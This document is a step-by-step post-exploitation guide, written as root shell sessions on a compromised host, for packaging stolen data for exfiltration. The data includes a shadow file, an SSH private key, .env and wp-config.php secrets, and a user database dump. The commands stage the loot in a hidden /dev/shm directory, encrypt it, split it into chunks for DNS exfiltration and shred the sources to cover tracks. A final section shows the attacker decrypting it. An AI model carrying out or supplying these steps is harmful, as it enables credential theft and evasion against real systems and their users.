# Data Packaging for Exfiltration

## Step-by-Step Encryption and Preparation

### Step 1: Inventory Collected Data
```bash
root@target:~# find /dev/shm/.work/loot/ -type f -exec ls -lh {} \;
-rw-r----- 1 root root 1.5K /dev/shm/.work/loot/shadow
-rw------- 1 root root  411 /dev/shm/.work/loot/id_ed25519
-rw-r--r-- 1 root root 1.2K /dev/shm/.work/loot/.env
-rw-r--r-- 1 root root 3.0K /dev/shm/.work/loot/wp-config.php
-rw-r--r-- 1 root root  15K /dev/shm/.work/loot/users_dump.sql
# Total: ~21KB
```

### Step 2: Compress
```bash
root@target:~# tar czf /dev/shm/.work/data.tar.gz -C /dev/shm/.work/loot/ .
root@target:~# ls -lh /dev/shm/.work/data.tar.gz
-rw-r--r-- 1 root root 8.2K Jan 15 19:00 data.tar.gz
```

### Step 3: Encrypt with Random Key
```bash
# Generate random passphrase
root@target:~# PASS=$(openssl rand -hex 32)
root@target:~# echo "KEY: $PASS" | tee /dev/shm/.work/.key
KEY: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1

# Encrypt
root@target:~# openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
  -in /dev/shm/.work/data.tar.gz \
  -out /dev/shm/.work/data.enc \
  -k "$PASS"
```

### Step 4: Integrity Hash
```bash
root@target:~# sha256sum /dev/shm/.work/data.enc
f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3  data.enc

# Also hash the original tar for verification after decryption
root@target:~# sha256sum /dev/shm/.work/data.tar.gz
c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0  data.tar.gz
```

### Step 5: Split for Transfer (if needed)
```bash
# For DNS exfil or chunked upload
root@target:~# split -b 2k /dev/shm/.work/data.enc /dev/shm/.work/chunk_
root@target:~# ls /dev/shm/.work/chunk_*
/dev/shm/.work/chunk_aa
/dev/shm/.work/chunk_ab
/dev/shm/.work/chunk_ac
/dev/shm/.work/chunk_ad
/dev/shm/.work/chunk_ae
```

### Step 6: Cleanup Source
```bash
root@target:~# shred -vfz -n 3 /dev/shm/.work/data.tar.gz
root@target:~# rm -rf /dev/shm/.work/loot/
# Keep only: data.enc (or chunks) + .key
```

## Decryption (Attacker Side)
```bash
attacker$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 \
  -in data.enc \
  -out data.tar.gz \
  -k "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"

attacker$ sha256sum data.tar.gz
c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0  data.tar.gz
# Matches ✅

attacker$ tar xzf data.tar.gz
attacker$ ls
.env  id_ed25519  shadow  users_dump.sql  wp-config.php
```
